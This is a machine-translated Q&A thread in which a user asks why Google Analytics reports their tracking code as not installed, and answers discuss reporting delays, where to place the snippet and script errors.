> 
> 赞同：0
> 
> 时间：2012-08-13T03:51:02.847
> 
> 标签：google-analytics, tracking

我试图在网站[http://vykup-bronzu.sk](http://vykup-bronzu.sk)上安装谷歌分析。

问题是，它仍然显示跟踪代码的“未安装”状态。

我已经弄清楚了一些谷歌搜索和使用 GA 调试器，但仍然不知道问题出在哪里:(

跟踪代码在 head 标签中。

调试器结果：

```
    _gaq.push 为 args 处理“_setAccount”：“[UA-34054138-1]”：ga_debug.js:18
    _gaq.push 为 args 处理“_trackPageview”：“[]”：ga_debug.js:18
    跟踪浏览量 ga_debug.js:18
    跟踪信标发送！
    utmwv=5.3.4d&utms=7&utmn=197771223&utmhn=vykup-bronzu.sk&utmcs=UTF-8&utmsr=1440x900&utmvp=1423x355&utmsc=32-bit&utmul=sk&utmje=1&utmfl=11.3%20r31&utmdt=v%Lu%C3%20r31&utmdt=V%Lu%C3% 20s.ro&utmhid=264692647&utmr=-&utmp=%2F&utmac=UA-34054138-1&utmcc=__utma%3D251021313.380013673.1344828700.1344828700.1344828700.1%3B%2B__utmz%3D251021313.1344828700.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct )%7Cutmcmd%3D(无)%3B&utmu=q~ ga_debug.js:18
    帐户 ID：UA-34054138-1
    页面标题：Výkup 青铜 | Lutoby sro
    主机名：vykup-bronzu.sk
    页 ： /
    参考网址：-
    命中编号：264692647
    访客编号：380013673
    会话数：1
    会议时间 - 第一次：2012 年 8 月 13 日星期一 05:31:40 GMT 0200（中欧夏令时间）
    会议时间 - 最后：2012 年 8 月 13 日星期一 05:31:40 GMT 0200（中欧夏令时间）
    会议时间 - 当前：2012 年 8 月 13 日星期一 05:31:40 GMT 0200（中欧夏令时间）
    活动时间：2012 年 8 月 13 日星期一 05:31:40 GMT 0200（中欧夏令时间）
    活动会话：1
    广告系列数量：1
    活动来源：（直接）
    活动媒介：（无）；
    广告系列名称：（直接）
    语言：sk
    编码：UTF-8
    闪存版本：11.3 r31
    启用 Java : 真
    屏幕分辨率：1440x900
    浏览器尺寸：1423x355
    颜色深度：32 位
    Ga.js 版本：5.3.4d
    缓存破坏者：197771223 ga_debug.js:18

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-10T07:08:07.677

我也有同样的问题。我按照说明部署了分析代码，但我看到状态为“未安装跟踪代码”。所以我把它放了一天，第二天检查了状态。第二天，它也显示了相同的状态，但它也显示了访问者的数据。所以我想更新状态需要一段时间，因为在我的情况下它仍然显示“未安装”状态。顺便说一句，我昨天才安装了分析 :-)

第二天状态也更新为“接收数据”。所以我认为更新该标志状态需要一天的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:01:01.110

“找到代码片段后，将其复制并粘贴到内容底部，紧邻您计划跟踪的每个页面**的 </body> 标记之前。”**

[http://support.google.com/googleanalytics/bin/topic.py?topic=19783](http://support.google.com/googleanalytics/bin/topic.py?topic=19783)

您已将其安装在 <head> 中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-17T09:28:03.197

找到代码片段后，将其复制并粘贴到您的网页中，就在结束标记*之前。如果您的网站使用模板生成页面，请在包含该部分的文件中的结束标记之前输入模板。（大多数网站将一个文件重复用于常见内容，因此您可能不必将代码片段放在网站的每个页面上。）

从你的链接。显然，您应该将其安装在头部。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-19T01:19:10.333

**同样的问题，一些修复：**

1) 可能显示未安装，但仍在安装并提供信息。太糟糕了。

2) 另一个 JS 脚本可能在执行 GA 脚本之前失败，这导致 GA 脚本显示此类错误。要检查这一点，您可以使用 firebug 控制台。

3) 我很清楚，不仅分析，而且其他谷歌技术和软件都在修改和扩展。例如：Angular.Js 去年我发现并报告了很多问题。我也不会太相信 GA 结果。

3) 个人建议：下载像 Piwik 这样的替代品。